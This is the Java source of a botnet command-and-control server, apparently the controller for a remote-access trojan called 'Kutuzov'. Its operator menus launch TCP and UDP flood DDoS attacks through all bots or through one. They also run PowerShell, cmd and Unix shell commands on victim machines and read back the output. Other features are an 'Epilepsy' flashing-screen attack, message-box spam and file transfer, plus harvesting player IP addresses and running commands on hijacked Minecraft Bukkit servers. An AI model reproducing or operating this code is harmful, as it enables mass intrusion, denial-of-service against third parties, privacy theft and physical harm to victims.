package me.kutuzov.server;

import me.kutuzov.packet.*;
import me.kutuzov.packet.bukkit.*;
import me.kutuzov.server.client.Client;
import me.kutuzov.server.client.ClientManager;
import me.kutuzov.server.kftp.KFTPPanel;
import me.kutuzov.server.util.LoadingWheel;
import me.pk2.moodlyencryption.MoodlyEncryption;

import java.awt.*;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OptionalDataException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import static me.kutuzov.server.KutuzovEnvironment.*;
import static me.kutuzov.server.util.ConsoleUtils.*;

public class KutuzovServer {
    public final ClientManager clientManager;
    private final LoadingWheel loadingWheel;
    private ServerSocket serverSocket;
    private Thread thread, checkThreadLoop;

    public KutuzovServer() {
        this.loadingWheel = new LoadingWheel();
        this.clientManager = new ClientManager();
    }

    public void boot() {
        loadingWheel.status.set("Booting server...");
        loadingWheel.showing.set(true);

        try {
            serverSocket = new ServerSocket(PORT);
        } catch (IOException exception) {
            loadingWheel.status.set("Failed to boot server!");
            loadingWheel.showing.set(false);
            exception.printStackTrace();

            return;
        }

        thread = new Thread(() -> {
            while(true) {
                Socket clientSocket;
                try {
                    clientSocket = serverSocket.accept();
                } catch (IOException exception) {
                    exception.printStackTrace();
                    continue;
                }

                Client client = clientManager.newClient(clientSocket);
                try {
                    client.getOutput().writeObject(new SCRequireHandshakePacket());
                    CSHandshakePacket handshakePacket = (CSHandshakePacket)client.getInput().readObject();
                    client.setIdentifierName(handshakePacket.identifierName);
                    client.setOs(handshakePacket.os);
                    client.setLocalIp(handshakePacket.localIp);
                    client.setVersion(handshakePacket.version);
                } catch (IOException | ClassNotFoundException e) {
                    pnl("Could not request handshake from client(" + client.getIp() + ")!");
                }
            }
        });
        thread.start();

        checkThreadLoop = new Thread(() -> {
            while(true) {
                trySleep(5000);
                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> {
                        try {
                            entry.getValue().getOutput().writeObject(new SCKeepAlivePacket());
                        } catch (Exception e) {
                            clientManager.clients.remove(entry.getKey());
                            // pnl("Client disconnected(" + clientManager.clients.size() + "): " + entry.getKey());
                        }});
            }
        });
        checkThreadLoop.start();

        trySleep(1000);
        loadingWheel.showing.set(false);
        trySleep(1000);
        clearConsole();
        pnl("Booting server... OK!");
        pnl("Listening on " + serverSocket.getInetAddress().getHostAddress() + ":" + serverSocket.getLocalPort());
        trySleep(3000);
        menu();
    }

    private void packet_csda_send(String data, Client client) {
        try {
            ObjectOutputStream outputStream = client.getOutput();
            outputStream.writeObject(new SCDAPacket(data));

            ObjectInputStream inputStream = client.getInput();
            CSDAResPacket resPacket = (CSDAResPacket) inputStream.readObject();

            switch (resPacket.response) {
                case CSDAResPacket.RESPONSE_OK:
                    pnl("Sent to " + client.getFormattedIdentifierName());
                    break;
                case CSDAResPacket.RESPONSE_ERROR:
                    pnl("Error sending to " + client.getFormattedIdentifierName());
                    break;
                case CSDAResPacket.RESPONSE_BUSY:
                    pnl(client.getFormattedIdentifierName() + " is busy!");
                    break;
            }
        } catch (Exception e) { pnl("Failed to send data to " + client.getFormattedIdentifierName() + "! (" + e.getMessage() + ")"); }
    }

    private void packet_csda(String data, Client client) {
        try {
            MoodlyEncryption encryption = new MoodlyEncryption();
            String key = encryption.getKey();
            String encryptedData = new String(encryption.encrypt(data)) + key;

            if(client == null)
                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> packet_csda_send(encryptedData, entry.getValue()));
            else asyncRun(() -> packet_csda_send(encryptedData, client));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void dos_options() {
        clearConsole();
        pnl("DDOS options:");
        pnl("  0) Back");
        pnl("  1) TCP Flood");
        pnl("  2) UDP Flood");
        // pnl("  3. HTTP Flood");
        pnl("");
        pwl("Select option: ");

        String line = readLine();
        int option = line.contentEquals("0") ? 0 : Integer.parseInt(line);
        switch (option) {
            case 1: {
                clearConsole();
                pnl("TCP Flood attack:");
                pnl("Please enter the IP address of the target: ");
                pwl("IP=");
                String ip = readLine();

                pnl("Please enter the port of the target: ");
                pwl("Port=");
                int port = Integer.parseInt(readLine());

                pnl("Please enter the amount of threads: ");
                pwl("Threads=");
                int threads = Integer.parseInt(readLine());

                pnl("Please enter the amount of time: ");
                pwl("Time(s)=");
                int time = Integer.parseInt(readLine())*1000;

                String data = String.format("tcp;%s;%s;%s;%s", ip, port, threads, time);

                packet_csda(data, null);
            } break;
            case 2: {
                clearConsole();
                pnl("UDP Flood attack:");
                pnl("Please enter the IP address of the target: ");
                pwl(" IP=");
                String ip = readLine();

                pnl("Please enter the port of the target: ");
                pwl(" Port=");
                int port = Integer.parseInt(readLine());

                pnl("Please enter the amount of threads: ");
                pwl(" Threads=");
                int threads = Integer.parseInt(readLine());

                pnl("Please enter the amount of time: ");
                pwl(" Time(s)=");
                int time = Integer.parseInt(readLine())*1000;

                String data = String.format("udp;%s;%s;%s;%s", ip, port, threads, time);

                packet_csda(data, null);
            } break;
            /*case 3: {

            } break;*/
            case 0: return;
            default:
                dos_options();
                break;
        }
    }

    private void user_list_client_dos_options(Client client) {
        clearConsole();
        pnl("Client DOS options:");
        pnl("  0) Back");
        pnl("  1) TCP Flood");
        pnl("  2) UDP Flood");
        pwl("Option: ");

        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        clearConsole();
        switch (option) {

            case 1:
            case 2: {
                String protocol = option == 1? "tcp" : "udp";
                pnl(protocol.toUpperCase(Locale.ROOT) + " Flood attack:");

                pnl("Please enter the IP address of the target: ");
                pwl("IP=");
                String ip = readLine();

                pnl("Please enter the port of the target: ");
                pwl("Port=");
                int port = Integer.parseInt(readLine());

                pnl("Please enter the amount of threads: ");
                pwl("Threads=");
                int threads = Integer.parseInt(readLine());

                pnl("Please enter the amount of time: ");
                pwl("Time(s)=");
                int time = Integer.parseInt(readLine())*1000;

                String data = String.format(protocol + ";%s;%s;%s;%s", ip, port, threads, time);

                packet_csda(data, client);
            } break;

            case 0: return;
            default:
                user_list_client_dos_options(client);
                break;
        }
    }

    private void user_list_header(Client client) {
        pnl("CLIENT VERSION: " + client.getVersion());
        pnl("ID: " + client.getIdentifierName());
        pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
        pnl("OS: " + client.getOs());
        pnl("LocalIP: " + client.getLocalIp());
        pnl("IsMC: " + client._isMC());
    }

    private void user_list_client_windows(Client client) {
        clearConsole();
        user_list_header(client);
        pnl("Options: ");
        pnl("  0) Go back");
        pnl("  1) Epilepsy");
        pnl("  2) Powershell");
        pnl("  3) Execute cmd command");
        pwl("Option: ");

        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        switch (option) {
            case 1: {
                clearConsole();
                pnl("Please enter the amount of time(ms):");
                pwl("Time(ms): ");
                int time = Integer.parseInt(readLine());
                try {
                    client.getOutput().writeObject(new SCEpilepsyPacket(time));
                } catch (IOException exception) {
                    pnl("Failed to send epilepsy to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                }
            } break;

            case 2: {
                clearConsole();
                pwl("Command: ");
                String command = readLine();
                try {
                    client.getOutput().writeObject(new SCPowershellCommandPacket(command));
                    Packet packet = null;
                    while(packet == null || !(packet instanceof CSPowershellResponsePacket)) {
                        try {
                            packet = (Packet) client.getInput().readObject();
                        } catch (OptionalDataException exception) { } catch (IOException exception) {
                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                            readLine();
                            break;
                        } catch (Exception exception) { }
                    }

                    if(packet == null)
                        return;
                    CSPowershellResponsePacket responsePacket = (CSPowershellResponsePacket)packet;
                    String response = responsePacket.response;
                    pnl("Response: \n  " + response);
                    readLine();
                } catch (IOException exception) {
                    pnl("Failed to send powershell command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    exception.printStackTrace();
                    readLine();
                }
            } break;

            case 3: {
                clearConsole();
                pwl("Command: ");
                String command = readLine();
                try {
                    client.getOutput().writeObject(new SCWinCommandPacket(command));
                    Packet packet = null;
                    while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
                        try {
                            packet = (Packet) client.getInput().readObject();
                        } catch (OptionalDataException exception) { } catch (IOException exception) {
                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                            readLine();
                            break;
                        } catch (Exception exception) { }
                    }

                    if(packet == null)
                        return;
                    CSWinCommandResponsePacket responsePacket = (CSWinCommandResponsePacket)packet;
                    String response = responsePacket.response;
                    pnl("Response: \n  " + response);
                    readLine();
                } catch (IOException exception) {
                    pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                }
            } break;

            case 0:
                return;
            default: break;
        }
    }

    private void user_list_client_unix(Client client) {
        clearConsole();
        user_list_header(client);
        pnl("Options: ");
        pnl("  0) Go back");
        pnl("  1) Execute command");
        pwl("Option: ");

        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        switch (option) {
            case 1: {
                clearConsole();
                pwl("Command: ");
                String command = readLine();
                try {
                    client.getOutput().writeObject(new SCUnixCommandPacket(command));
                    Packet packet = null;
                    while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
                        try {
                            packet = (Packet) client.getInput().readObject();
                        } catch (OptionalDataException exception) { } catch (IOException exception) {
                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                            readLine();
                            break;
                        } catch (Exception exception) { }
                    }

                    if(packet == null)
                        return;
                    CSUnixCommandResponsePacket responsePacket = (CSUnixCommandResponsePacket)packet;
                    String response = responsePacket.response;
                    pnl("Response: \n  " + response);
                    readLine();
                } catch (Exception exception) {
                    pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                }
            } break;

            case 0:
                return;
            default: break;
        }
    }

    private void user_list_client_bukkit(Client client) {
        clearConsole();

        CSBukkitInfo info = null;
        try {
            client.getOutput().writeObject(new SCBukkitInfo());
            Packet packet = null;
            while(!(packet instanceof CSBukkitInfo)) {
                try {
                    packet = (Packet) client.getInput().readObject();
                } catch (OptionalDataException exception) { } catch (IOException exception) {
                    pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                    return;
                } catch (Exception exception) { }
            }

            info = (CSBukkitInfo)packet;
        }catch (IOException exception) {
            exception.printStackTrace();
            return;
        }

        user_list_header(client);
        pnl("Bukkit Version: " + info.VERSION);
        pnl("Bukkit Port: " + info.PORT);
        pnl("Options: ");
        pnl("  0) Go back");
        pnl("  1) Send console command");
        pnl("  2) Send command as player");
        pnl("  3) Send message as player");
        pnl("  4) Get player ip");
        pnl("  5) Install plugin");
        pnl("  6) Toggle plugin");
        pwl("Option: ");
        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        switch (option) {
            case 1: {
                clearConsole();
                pnl("Please input the desired command: ");
                pwl("Command: ");

                String command = readLine();

                try {
                    client.getOutput().writeObject(new SCBukkitCommand(command));
                    pnl("Command sent!");
                    break;
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 2: {
                clearConsole();
                pnl("Please input the desired player: ");
                pwl("Player: ");

                String player = readLine();

                pnl("Please input the desired command: ");
                pwl("Command: ");

                String command = readLine();

                try {
                    client.getOutput().writeObject(new SCBukkitPlayerCommand(player, command));
                    pnl("Command sent!");
                    break;
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 3: {
                clearConsole();
                pnl("Please input the desired player: ");
                pwl("Player: ");

                String player = readLine();

                pnl("Please input the desired message: ");
                pwl("Message: ");

                String message = readLine();

                try {
                    client.getOutput().writeObject(new SCBukkitPlayerChat(player, message));
                    pnl("Message sent!");
                    break;
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            } break;

            case 4: {
                clearConsole();
                pnl("Please input the desired player: ");
                pwl("Player: ");

                String player = readLine();

                try {
                    client.getOutput().writeObject(new SCBukkitPlayerAddress(player));

                    Packet packet = null;
                    while(!(packet instanceof CSBukkitPlayerAddress)) {
                        try {
                            packet = (Packet) client.getInput().readObject();
                        } catch (OptionalDataException exception) { } catch (IOException exception) {
                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                            readLine();
                            return;
                        } catch (Exception exception) { }
                    }

                    CSBukkitPlayerAddress bukkitPlayerAddress = (CSBukkitPlayerAddress)packet;
                    pnl(player + "'s address is: " + bukkitPlayerAddress.address);
                    readLine();
                    break;
                } catch (IOException exception) {
                    exception.printStackTrace();
                }
            }

            case 0:
                user_list_client(client);
                break;
            default:
                break;
        }

        user_list_client_bukkit(client);
    }

    private void user_list_client(Client client) {
        clearConsole();
        user_list_header(client);
        pnl("Options: ");
        pnl("  0) Go back");
        pnl("  1) Send message");
        pnl("  2) DOS options");
        pnl("  3) Logger options");
        pnl("  4) Windows only options");
        pnl("  5) Beep");
        pnl("  6) KFTP(Kutuzov's File Transfer Protocol)");
        pnl("  7) Unix only options");
        pnl("  8) Bukkit only options");
        pwl("Option: ");
        String input = readLine();
        int option = input.contentEquals("")?-1:Integer.parseInt(input);
        switch (option) {
            case 1: {
                clearConsole();
                pnl("Please enter the title of the messagebox: ");
                pwl("Title: ");
                String title = readLine();

                pnl("Please enter the message: ");
                pwl("Content: ");
                String content = readLine();

                pnl("Please enter the amount of messageboxes: ");
                pwl("Amount: ");
                int amount = Integer.parseInt(readLine());

                try {
                    client.getOutput().writeObject(new SCMessageBoxPacket(title, content, amount));
                } catch (Exception e) {
                    pnl("Failed to send message! (" + e.getMessage() + ")");
                    readLine();
                }
            } break;

            case 2:
                user_list_client_dos_options(client);
                break;

            case 4:
                user_list_client_windows(client);
                break;

            case 5: {
                try {
                    client.getOutput().writeObject(new SCBeepPacket());
                } catch (IOException exception) {
                    pnl("Failed to send beep to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                    readLine();
                }
            } break;

            case 6:
                KFTPPanel.panel_entry(client);
                break;

            case 7:
                user_list_client_unix(client);
                break;

            case 8:
                user_list_client_bukkit(client);
                break;

            case 0:
                menu();
                return;
            default: break;
        }

        user_list_client(client);
    }

    private void user_list() {
        clearConsole();
        pnl("User list(" + clientManager.clients.size() + "):");
        for(Map.Entry<String, Client> entry : clientManager.clients.entrySet())
            pnl(" - " + entry.getValue().getFormattedIdentifierName());
        pwl("Select user(0 to go back): ");
        String input = readLine();
        if(input.equals("0"))
            return;

        Client client = clientManager.findClient(input);
        if(client == null) {
            pnl("User not found!");
            user_list();
            return;
        }

        user_list_client(client);
    }



    private void menu() {
        clearConsole();
        pnl("Connected clients: " + clientManager.clients.size());
        pnl("Select action:");
        pnl("  0) Refresh");
        pnl("  1) MessageBox all clients");
        pnl("  2) DDOS options");
        pnl("  3) User list");
        pnl("  4) Beep all");
        pnl("  9) Stop server & exit");
        pnl("");
        pwl("Select action: ");

        String line = readLine();
        int option = line.contentEquals("")?0:Integer.parseInt(line);
        switch (option) {
            case 1:
                clearConsole();
                pnl("Please enter the title of the message box:");
                pwl("Title: ");
                String title = readLine();

                pnl("Please enter the content of the message box:");
                pwl("Enter the content: ");
                String content = readLine();

                pnl("Please enter the amount of message boxes:");
                pwl("Enter the amount: ");
                int amount = Integer.parseInt(readLine());

                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> {
                        try {
                            ObjectOutputStream objectOutputStream = entry.getValue().getOutput();
                            objectOutputStream.writeObject(new SCMessageBoxPacket(title, content, amount));
                        } catch (Exception e) { e.printStackTrace(); }});
                menu();
                break;
            case 2:
                dos_options();
                menu();
                break;
            case 3:
                user_list();
                menu();
                break;
            case 4:
                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> {
                        try {
                            ObjectOutputStream objectOutputStream = entry.getValue().getOutput();
                            objectOutputStream.writeObject(new SCBeepPacket());
                        } catch (Exception e) { e.printStackTrace(); }});
                menu();
                break;

            case 9:
                System.exit(0);
                break;
            case 0:
            default: menu();
        }
    }
}